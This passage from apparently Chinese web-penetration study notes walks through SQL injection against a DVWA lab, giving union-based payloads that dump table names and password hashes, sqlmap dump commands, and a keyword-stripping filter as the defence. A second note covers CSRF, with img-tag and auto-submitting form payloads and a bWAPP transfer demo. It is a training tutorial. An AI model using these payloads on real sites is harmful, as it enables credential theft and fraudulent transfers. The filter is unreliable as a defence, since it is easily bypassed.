href="#0X02-注入漏洞分类" class="headerlink" title="0X02 注入漏洞分类"></a>0X02 注入漏洞分类</h1><h2 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h2><p><a href="http://www.test.com/test.php?id=1" target="_blank" rel="external nofollow noopener noreferrer">http://www.test.com/test.php?id=1</a><br>猜测SQL语句为：select * from table where id=1<br><strong>测试：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1’</span><br></pre></td></tr></table></figure><p>SQL语句为：select * from table where id=1’ ，页面出现异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure><p>SQL语句为：select * from table where id=1 and 1=1 ，页面正常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.test.com&#x2F;test.php?id&#x3D;1 and 1&#x3D;2</span><br></pre></td></tr></table></figure><p>SQL语句为：select * from table where id=1 and 1=2，返回数据与原始请求不同<br><strong>注：当输入的参数为整型时，如：ID，年龄，页码等，如果存在注入漏洞，则可以认为是数字型注入。</strong></p><h2 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h2><p>数字型：select * from table where id =1<br>字符型：select * from table where username=‘test’<br>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码<br>查询内容为字符串时：select * from table where username = ‘test’<br><strong>测试：</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where username &#x3D; &#39;test and 1&#x3D;1&#39;</span><br></pre></td></tr></table></figure><p>无法注入，“test and 1=1”会被数据库当作查询的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where username &#x3D; &#39;test&#39; and &#39;1&#39;&#x3D;&#39;1&#39; --&#39;</span><br></pre></td></tr></table></figure><p>必须闭合字符串才可以继续注入</p><p><strong>数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合</strong></p><h2 id="3、数据库注释的语法"><a href="#3、数据库注释的语法" class="headerlink" title="3、数据库注释的语法"></a>3、数据库注释的语法</h2><p><img src="https://img-blog.csdnimg.cn/20200724115526541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt></p><h2 id="4、测试语句"><a href="#4、测试语句" class="headerlink" title="4、测试语句"></a>4、测试语句</h2><p><img src="https://img-blog.csdnimg.cn/20200724115546152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt></p><h2 id="5、SQL注入分类细化"><a href="#5、SQL注入分类细化" class="headerlink" title="5、SQL注入分类细化"></a>5、SQL注入分类细化</h2><h3 id="5-1按照数据类型："><a href="#5-1按照数据类型：" class="headerlink" title="5.1按照数据类型："></a>5.1按照数据类型：</h3><ul><li>数字形（Integer）</li><li>字符型（String）<h3 id="5-2按返回结果："><a href="#5-2按返回结果：" class="headerlink" title="5.2按返回结果："></a>5.2按返回结果：</h3></li><li>显错注入（Error-Based）  </li><li>盲注（Boolean/Time-Based Blind）<h3 id="5-3其他分类"><a href="#5-3其他分类" class="headerlink" title="5.3其他分类"></a>5.3其他分类</h3></li><li>POST注入：注入字段在POST数据中</li><li>Cookie注入：注入字段在Cookie数据中</li><li>搜索注入：注入处为搜索的点</li><li>Baes64注入：注入字符串需要经过base64加密</li><li>布尔型盲注：即可以根据返回页面判断条件真假的注入</li><li>时间延迟型盲注：即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断</li><li>报错回显型注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中</li><li>联合查询型注入：可以使用union的情况下的注入</li><li>堆查询型注入：可以同时执行多条语句的执行时的注入<h2 id="6、演示：以DVWA的字符型注入为例"><a href="#6、演示：以DVWA的字符型注入为例" class="headerlink" title="6、演示：以DVWA的字符型注入为例"></a>6、演示：以DVWA的字符型注入为例</h2><h3 id="6-1判断是否存在注入"><a href="#6-1判断是否存在注入" class="headerlink" title="6.1判断是否存在注入"></a>6.1判断是否存在注入</h3>执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure>结果如下:<br><img src="https://img-blog.csdnimg.cn/20200724115101983.png" alt></li></ul><p>再执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure><p>结果如下:<br><img src="https://img-blog.csdnimg.cn/20200724115124604.png" alt><br><img src="https://img-blog.csdnimg.cn/20200724115138622.png" alt></p><p><strong>表明参数类型为字符型。</strong><br>再执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;and&#39;1&#39;&#x3D;&#39;1&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure><p>结果如下:<br><img src="https://img-blog.csdnimg.cn/20200724115151456.png" alt></p><p>产生的结果与id=1的内容相同。<br>接着执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;and&#39;1&#39;&#x3D;&#39;2&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure><p>不显示任何内容。<br><img src="https://img-blog.csdnimg.cn/20200724115201737.png" alt></p><p><strong>表明此处可能存在有注入漏洞。</strong>  </p><h3 id="6-2利用order-by判断该数据表的字段数量"><a href="#6-2利用order-by判断该数据表的字段数量" class="headerlink" title="6.2利用order by判断该数据表的字段数量"></a>6.2利用order by判断该数据表的字段数量</h3><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;order by 5%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20200724115219671.png" alt></p><p>通过更换order by后面的数字，直到能够返回正常的最大值：2<br><img src="https://img-blog.csdnimg.cn/20200724115230621.png" alt></p><p>由此可得到该数据表的字段数为2。  </p><h3 id="6-3用union查询标记可以执行SQL的位置"><a href="#6-3用union查询标记可以执行SQL的位置" class="headerlink" title="6.3用union查询标记可以执行SQL的位置"></a>6.3用union查询标记可以执行SQL的位置</h3><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select 1,2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure><p>结果如下是：表明在1,2处可以执行SQL语句。<br><img src="https://img-blog.csdnimg.cn/20200724115239856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt></p><h3 id="6-4用datebase（）函数在1处查询当前数据库名"><a href="#6-4用datebase（）函数在1处查询当前数据库名" class="headerlink" title="6.4用datebase（）函数在1处查询当前数据库名"></a>6.4用datebase（）函数在1处查询当前数据库名</h3><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select database(),2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200724115253193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt></p><h3 id="6-5查询dvwa数据库的表"><a href="#6-5查询dvwa数据库的表" class="headerlink" title="6.5查询dvwa数据库的表"></a>6.5查询dvwa数据库的表</h3><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select table_name from information_schema.tables where table_schema &#x3D; &#39;dvwa&#39; limit0,1),2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20200724115305352.png" alt></p><p>得到了dvwa的第一个表guestbook，以同样的方式改变limit的参数为limit1,1可获得第二个表users。如下图：<br><img src="https://img-blog.csdnimg.cn/20200724115314610.png" alt></p><p>比较两个表名，推测用户名可能在users表中，故先查询users中的字段。</p><h3 id="6-6查询users表中的字段"><a href="#6-6查询users表中的字段" class="headerlink" title="6.6查询users表中的字段"></a>6.6查询users表中的字段</h3><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;DVWA&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select column_name from information_schema.columns where table_schema &#x3D; &#39;dvwa&#39; and table_name &#x3D; &#39;users&#39; limit 0,1),2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://img-blog.csdnimg.cn/20200724115325603.png" alt></p><p>得出来users表的的第一个字段为user_id，同理可得第二个为 first_name，第三个为last_name，第四个为user，第五个为password，第六个为avatar，······</p><h3 id="6-7获取user字段的第二个数据和password字段的第二个数据"><a href="#6-7获取user字段的第二个数据和password字段的第二个数据" class="headerlink" title="6.7获取user字段的第二个数据和password字段的第二个数据"></a>6.7获取user字段的第二个数据和password字段的第二个数据</h3><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select user from dvwa.users limit 1,1),2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure><p>获得user字段的第二个数据为：<br><img src="https://img-blog.csdnimg.cn/20200724115337370.png" alt></p><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.234.33.158&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1&#39;union select (select password from dvwa.users limit 1,1),2%23&amp;Submit&#x3D;Submit#</span><br></pre></td></tr></table></figure><p>获得password字段的第二个数据<br><img src="https://img-blog.csdnimg.cn/2020072411534549.png" alt></p><p>MD5解密密码得：<br><img src="https://img-blog.csdnimg.cn/20200724115354425.png" alt></p><p>尝试登陆：<br><img src="https://img-blog.csdnimg.cn/20200724115403611.png" alt></p><p>登陆成功！ </p><h1 id="0X03-SQL注入的利用工具：sqlmap"><a href="#0X03-SQL注入的利用工具：sqlmap" class="headerlink" title="0X03 SQL注入的利用工具：sqlmap"></a>0X03 SQL注入的利用工具：sqlmap</h1><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。采用五种独特的SQL注入技术，分别是：</p><ul><li>1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li><li>2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li><li>4）联合查询注入，可以使用union的情况下的注入。</li><li>5）堆查询注入，可以同时执行多条语句的执行时的注入。<h2 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h2></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 --dbs</span><br></pre></td></tr></table></figure><p>-u 指定检测的URL地址 –dbs列出数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms --tables</span><br></pre></td></tr></table></figure><p>获取指定数据库cms的表名 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms -T cms_users --columns</span><br></pre></td></tr></table></figure><p>获取指定数据库cms及指定表cms_users的列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;10.1.131.10&#x2F;cms&#x2F;show.php?id&#x3D;35 -D cms -T cms_users -C username,password --dump</span><br></pre></td></tr></table></figure><p>dump列username和password的值</p><p>-r c:\sqltest.txt  加载请求数据<br>–cookie=COOKIE  登录后的cookie<br>–proxy=”<a href="http://127.0.0.1:8080&quot;" rel="external nofollow noopener noreferrer" target="_blank">http://127.0.0.1:8080&quot;</a>  使用HTTP代理  </p><h1 id="0X04防御SQL注入"><a href="#0X04防御SQL注入" class="headerlink" title="0X04防御SQL注入"></a>0X04防御SQL注入</h1><h2 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h2><p>这些危害包括但不局限于：</p><ul><li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li><li>网页篡改：通过操作数据库对特定网页进行篡改。</li><li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li><li>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li><li>破坏硬盘数据，瘫痪全系统。</li></ul><p>一些类型的数据库系统能够让SQL指令操作文件系统，这使得SQL注入的危害被进一步放大。</p><h2 id="防御手段：过滤用户输入"><a href="#防御手段：过滤用户输入" class="headerlink" title="防御手段：过滤用户输入"></a>防御手段：过滤用户输入</h2><h3 id="过滤对象"><a href="#过滤对象" class="headerlink" title="过滤对象"></a>过滤对象</h3><ul><li>用户的输入</li><li>提交的URL请求中的参数部分</li><li>从cookie中得到的数据</li><li>部署防SQL注入系统或脚本<h3 id="过滤类容"><a href="#过滤类容" class="headerlink" title="过滤类容"></a>过滤类容</h3>单引号、双引号、斜杠、反斜杠、冒号、空字符等的字符，如图PHP中利用<br>str_replace方法把特殊字符替换成空格，如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function dowith_sql($a)&#123;</span><br><span class="line">   $a &#x3D; str_replace(&quot;and&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;execute&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;update&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;count&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;chr&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;ma&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;master&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;truncate&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;char&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;declare&quot;,&quot;&quot;,$a); </span><br><span class="line">   $a &#x3D; str_replace(&quot;select&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;create&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;delete&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;insert&quot;,&quot;&quot;,$a);</span><br><span class="line">   &#x2F;&#x2F;$a &#x3D; str_replace(&quot;&#39;&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;\&quot;&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot; &quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;or&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;&#x3D;&quot;,&quot;&quot;,$a);</span><br><span class="line">   $a &#x3D; str_replace(&quot;%20&quot;,&quot;&quot;,$a);</span><br><span class="line">   return $a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0X00-数据库相关概念&quot;&gt;&lt;a href=&quot;#0X00-数据库相关概念&quot; class=&quot;headerlink&quot; title=&quot;0X00 数据库相关概念&quot;&gt;&lt;/a&gt;0X00 数据库相关概念&lt;/h1&gt;&lt;h4 id=&quot;数据（DATA）：图像、语音、文字&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
    
      <category term="学习笔记" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="SQL注入" scheme="https://s40d1.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>第四节 跨站请求伪造（CSRF）漏洞</title>
    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E8%8A%82%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89%E6%BC%8F%E6%B4%9E/"/>
    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E7%AC%AC%E5%9B%9B%E8%8A%82%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-07-08T11:17:37.000Z</published>
    <updated>2020-07-08T14:53:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="0x00-CSRF原理概要"><a href="#0x00-CSRF原理概要" class="headerlink" title="0x00 CSRF原理概要"></a>0x00 CSRF原理概要</h1><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h2><ol><li>CSRF（Cross-Site Request Forgery）是指跨站请求伪造，通常缩写为CSRF或者是XSRF。</li><li>也可以这么理解CSRF攻击：攻击者盗用了你的身份（即用了你的COOKIE），以你的名义进行某些非法操作。CSRF能够修改你的密码，使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的财产等。<h2 id="2-必要条件"><a href="#2-必要条件" class="headerlink" title="2. 必要条件"></a>2. 必要条件</h2>要完成一次CSRF攻击，受害者必须依次完成三个要素：<blockquote><p>登录受信任网站A，并在本地生成Cookie<br>在不登出A的情况下，访问恶意网站B<br>必须是同一浏览器，因为不同浏览器不能相互利用COOKIE</p></blockquote></li></ol><h2 id="3-攻击过程原理"><a href="#3-攻击过程原理" class="headerlink" title="3. 攻击过程原理"></a>3. 攻击过程原理</h2><p><strong>Web A 为存在CSRF漏洞<br>Web B 为攻击者的恶意网站<br>User C 为Web A的用户</strong></p><p><img src="https://img-blog.csdnimg.cn/20200708220835653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</p></li><li><p>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功；</p></li><li><p>用户未退出网站A的情况下，在同一浏览器中访问网站B；</p></li><li><p>网站B接收到用户请求后，返回攻击代码，并发出一个请求要求访问第三方站点A；</p></li><li><p>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。</p></li></ul><p><strong>网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，<br>导致网站B的恶意代码被执行。</strong></p><h2 id="4-CSRF与XSS的区别"><a href="#4-CSRF与XSS的区别" class="headerlink" title="4. CSRF与XSS的区别"></a>4. CSRF与XSS的区别</h2><p>XSS：<br>攻击者发现XSS漏洞——构造代码——发送给受害人——受害人打开——攻击者获取受害人的cookie——完成攻击<br><strong>攻击者需要登录后台完成攻击</strong></p><p>CSRF：<br>攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击<br><strong>攻击是管理员自己实现的，攻击者只负责了构造代码</strong></p><p>CSRF少了获取cookie的步骤，为什么会少了呢。因为受害人在执行恶意代码的时候就已经完成了攻击，而攻击者并没有参与进来。</p><h1 id="0x01-漏洞分类"><a href="#0x01-漏洞分类" class="headerlink" title="0x01 漏洞分类"></a>0x01 漏洞分类</h1><h2 id="1-GET型CSRF"><a href="#1-GET型CSRF" class="headerlink" title="1. GET型CSRF"></a>1. GET型CSRF</h2><p>这种类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;http:&#x2F;&#x2F;漏洞地址&gt;</span><br></pre></td></tr></table></figure><p>在访问含有这个img的页面后，成功向http://漏洞地址，发出了一次HTTP请求。所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。<br><img src="https://img-blog.csdnimg.cn/20200708221632461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="2-POST型CSRF"><a href="#2-POST型CSRF" class="headerlink" title="2. POST型CSRF"></a>2. POST型CSRF</h2><p>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;http:&#x2F;&#x2F;漏洞地址 method&#x3D;POST&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xx&quot; value&#x3D;&quot;11&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。</p><h2 id="3-常用的CSRF方式"><a href="#3-常用的CSRF方式" class="headerlink" title="3. 常用的CSRF方式"></a>3. 常用的CSRF方式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;img&gt;标签属性</span><br><span class="line">&lt;img src&#x3D;“http:&#x2F;&#x2F;漏洞地址”&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;标签属性</span><br><span class="line">&lt;script src&#x3D;“http:&#x2F;&#x2F;漏洞地址”&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe&gt;标签属性</span><br><span class="line">&lt;iframe src&#x3D;“http:&#x2F;&#x2F;漏洞地址”&gt;</span><br><span class="line"></span><br><span class="line">JavaScript方法</span><br><span class="line">Image对象</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var foo &#x3D; new Image();</span><br><span class="line">foo.src &#x3D; “http:&#x2F;&#x2F;漏洞地址”</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h1 id="0x02-攻击演示"><a href="#0x02-攻击演示" class="headerlink" title="0x02 攻击演示"></a>0x02 攻击演示</h1><h2 id="以bWAPP的CSRF-Transfer-Amount-为例"><a href="#以bWAPP的CSRF-Transfer-Amount-为例" class="headerlink" title="以bWAPP的CSRF (Transfer Amount)为例"></a>以bWAPP的CSRF (Transfer Amount)为例</h2><p>入图，原始账户金额为1000EUR<br><img src="https://img-blog.csdnimg.cn/20200708222954428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用burpsuite抓包构造POC<br><img src="https://img-blog.csdnimg.cn/20200708223212183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对生成的POC内转账金额参数值修改<br><img src="https://img-blog.csdnimg.cn/20200708223441937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将此poc页面放入本地服务器（恶意服务器）<br><img src="https://img-blog.csdnimg.cn/20200708224131961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在原浏览器访问本地该页面，<br><img src="https://img-blog.csdnimg.cn/20200708223842688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzUxNjY3NQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Submit request<br><img src="https://img-blog.csdnimg.cn/20200708224436770.png" alt="在这里插入图片描述"><br>结果发现账户金额变为800EUR，表示攻击成功<br><img 